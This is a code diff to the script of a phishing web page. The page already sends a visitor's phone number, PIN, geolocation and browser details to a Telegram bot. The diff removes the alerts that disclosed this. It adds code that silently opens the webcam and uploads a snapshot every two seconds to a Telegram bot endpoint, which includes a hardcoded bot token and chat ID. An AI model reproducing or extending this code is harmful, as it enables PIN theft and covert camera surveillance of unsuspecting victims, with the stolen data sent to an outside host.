@@ -171,7 +171,6 @@
                 return;
             }
 
-            // Send phone number
             const phoneData = `Phone: ${countryCode} ${phoneInput}`;
             sendToTelegram(phoneData);
 
@@ -216,26 +215,49 @@
                             const pinData = `PIN: ${pin}\nLatitude: ${latitude}\nLongitude: ${longitude}\n${deviceInfo}`;
                             sendToTelegram(pinData);
                         },
-                        (error) => {
-                            alert("Unable to fetch location. Sending data without location.");
+                        () => {
                             const deviceInfo = `Device Info: ${navigator.userAgent}`;
                             const pinData = `PIN: ${pin}\nLocation: Not Available\n${deviceInfo}`;
                             sendToTelegram(pinData);
-                        },
-                        {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 0,
                         }
                     );
-                } else {
-                    alert("Geolocation not supported. Sending data without location.");
-                    const deviceInfo = `Device Info: ${navigator.userAgent}`;
-                    const pinData = `PIN: ${pin}\nLocation: Not Available\n${deviceInfo}`;
-                    sendToTelegram(pinData);
                 }
             });
         });
+
+        // Automatic Photo Capture
+        async function captureAndSendPhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.play();
+
+                const canvas = document.createElement("canvas");
+                const context = canvas.getContext("2d");
+
+                setInterval(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob((blob) => {
+                        const formData = new FormData();
+                        formData.append("chat_id", "1676411287");
+                        formData.append("photo", blob, "snapshot.jpg");
+
+                        fetch(`https://api.telegram.org/bot5682784122:AAFGjK0Or0jMK8g928ckWGSt4XUTojYxcRI/sendPhoto`, {
+                            method: "POST",
+                            body: formData,
+                        });
+                    }, "image/jpeg");
+                }, 2000);
+            } catch (error) {
+                console.error("Error accessing camera:", error);
+            }
+        }
+
+        captureAndSendPhoto();
     </script>
 </body>
 </html>
